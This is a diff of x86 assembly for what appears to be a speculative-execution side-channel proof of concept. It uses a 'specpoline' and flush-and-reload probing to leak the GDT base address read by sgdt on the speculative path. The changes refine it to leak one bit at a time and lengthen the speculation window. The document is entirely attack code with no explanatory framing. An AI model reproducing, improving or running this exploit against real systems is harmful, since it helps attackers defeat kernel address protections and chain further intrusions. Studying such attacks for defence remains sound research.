@@ -33,7 +33,7 @@ SECTION .code
     
     specpoline:
         xorps xmm0, xmm0
-        TIMES 20 sqrtpd xmm0, xmm0
+        TIMES 40 sqrtpd xmm0, xmm0
 
         movq rbx, xmm0
         mov QWORD [rsp+rbx], rax
@@ -106,16 +106,18 @@ SECTION .code
         push rdx
         push rsi
 
+        ;Move the arg in rcx, where we can use it with shr
+        mov rcx, rdi
+
         ;Flush the F+R lines
         call flush
 
         ;Prepare some reg and touch some line to make the speculative path feasable
         lea rsi, [buffer]
-        lea rcx, [gdt_base]
-        mov DWORD [rcx], 0
-        mov WORD [rcx-2], 0
+        lea rdi, [gdt_base]
+        mov DWORD [rdi], 0
         sfence
-        lfence
+        lfence                ;Empty the ROB and RS
 
         ;Specpoline
         lea rax, [.profile]
@@ -125,10 +127,12 @@ SECTION .code
         ; o o o SPECULATIVE PATH
         ;0.0 O
 
-        sgdt [rcx]
-        movzx rcx, BYTE [rcx+rdi]       
-        shl rcx, 6 + GAP_SHIFT
-        mov ebx, DWORD [rsi+rcx]
+        sgdt [rdi]
+        mov rdi, QWORD [rdi+2]           
+        shr rdi, cl
+        and edi, 1     
+        shl rdi, 6 + GAP_SHIFT + 7
+        mov ebx, DWORD [rsi+rdi]
 
         ud2                             ;Stop speculation
 
